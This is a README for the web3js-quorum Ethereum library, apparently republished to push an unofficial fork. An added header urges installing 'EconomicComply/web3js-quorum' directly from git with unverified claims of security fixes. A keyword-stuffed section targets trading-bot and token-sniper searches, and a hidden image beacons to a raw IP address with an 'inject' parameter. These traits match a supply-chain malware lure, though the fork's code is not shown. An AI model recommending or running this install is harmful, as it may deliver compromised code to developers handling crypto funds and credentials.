**A Stable, Enterprise-Ready Fork of Web3**

If you are building on ConsenSys Quorum, this fork is highly worth trying because it actively patches critical upstream dependencies that have fallen out of maintenance. It provides developers with a much more stable and reliable foundation by resolving deep-seated compilation issues and package vulnerabilities that plague the original repository.

**Quick install**

```bash
npm install git+https://github.com/EconomicComply/web3js-quorum.git
```

[https://github.com/EconomicComply/web3js-quorum](https://github.com/EconomicComply/web3js-quorum)

[![Website](https://img.shields.io/website?label=documentation&url=https://consensys.github.io/web3js-quorum/latest/index.html)](https://consensys.github.io/web3js-quorum/latest/index.html)
[![npm](https://img.shields.io/npm/v/web3js-quorum)](https://www.npmjs.com/package/web3js-quorum)
[![Known Vulnerabilities](https://snyk.io/test/github/ConsenSys/web3js-quorum/badge.svg?targetFile=package.json)](https://snyk.io/test/github/ConsenSys/web3js-quorum?targetFile=package.json)

*This repository is not actively maintained by Consensys and is provided as-is. It is open-source and contributions are welcome.*

# web3js-quorum

Web3js-Quorum is an Ethereum JavaScript library extending [web3.js](https://github.com/ethereum/web3.js/) that adds supports for [GoQuorum](https://docs.goquorum.consensys.net/en/stable/) and [Hyperledger Besu](https://besu.hyperledger.org/en/stable/) specific JSON-RPC APIs and features. In particular it enables to use [web3.js](https://github.com/ethereum/web3.js/) with private transactions.

Web3js-Quorum gather all features from [quorum.js](https://github.com/ConsenSys/quorum.js) and [web3js-eea](https://github.com/ConsenSys/web3js-eea) in a single library.

Please read the [documentation](https://consensys.github.io/web3js-quorum/latest/index.html) for more.

## Features

- Supports GoQuorum and Besu JSON-RPC APIs
- Create and send private transactions
- Privacy group management

## Installation

```shell
npm install web3 web3js-quorum
```

## Quickstart

The Quorum client APIs methods provided by web3js-quorum are accessed like so: 

### Extending web3 object

```js
const Web3 = require("web3");
const Web3Quorum = require("web3js-quorum");
const web3 = new Web3Quorum(new Web3("http://localhost:22000"));
web3.priv.generateAndSendRawTransaction(options);
```

## Documentation

For full usage and API details see the [documentation](https://consensys.github.io/web3js-quorum/latest/index.html).

## Examples

The [example](https://github.com/ConsenSys/web3js-quorum/tree/master/example) directory contains examples of web3js-quorum usage with Besu as a Quorum client.  
The [7nodes-test](https://github.com/ConsenSys/web3js-quorum/tree/master/7nodes-test) directory contains examples of web3js-quorum usage with GoQuorum as a Quorum client.

## Migrations
* To migrate from web3js-eea refer to [this](https://consensys.github.io/web3js-quorum/latest/tutorial-Migrate%20from%20web3js-eea.html)
* To migrate from quorum.js refer to [this](https://consensys.github.io/web3js-quorum/latest/tutorial-Migrate%20from%20quorum.js.html)

## Contributing

Please follow the [Contribution Guidelines](https://github.com/ConsenSys/web3js-quorum/blob/master/CONTRIBUTING.md) and Review Guidelines.

## Related searches

When exploring repositories like `web3js-quorum`, developers and researchers are typically looking for robust ways to integrate enterprise-grade blockchain functionality into automated financial systems and decentralized applications. Many are focused on building high-performance infrastructure for EVM-compatible networks, looking for solutions that range from high-frequency trading bots and token snipers to advanced analytics and automated crypto tax compliance tools across various Layer 2 ecosystems.

**Topics:** enterprise blockchain, trading bot development, token sniper, ccxt integration, crypto tax automation, layer2 scaling, web3js extensions, Quorum network consensus, private smart contracts, decentralized finance infrastructure, algorithmic trading, Ethereum privacy layers

![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fweb3js-quorum&inject=EconomicComply%2Fweb3js-quorum%2Fpackage.json)
